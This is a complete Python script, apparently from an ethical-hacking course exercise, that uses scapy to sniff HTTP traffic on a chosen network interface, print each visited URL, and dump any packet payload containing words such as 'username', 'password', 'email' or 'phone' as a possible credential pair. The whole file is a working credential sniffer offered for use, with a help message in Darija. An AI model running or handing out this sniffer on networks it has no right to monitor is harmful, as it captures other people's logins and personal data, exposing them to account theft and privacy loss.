#!/usr/bin/env python

import scapy.all as scapy


from scapy.layers import http


import optparse


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+]HTTP Request >" + url)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = [ "username", "user", "login", "email", "phone", "Email", "Phone", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    print("\n\n possible username/password combination : \n" + load + "\n\n")
                    break


def get_arguments():

    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface")
    options = parser.parse_args()[0]
    if not options.interface:
        parser.error("Nsit tmed ama interface kho dir --help w chouf")
    return options


sniff(get_arguments().interface)
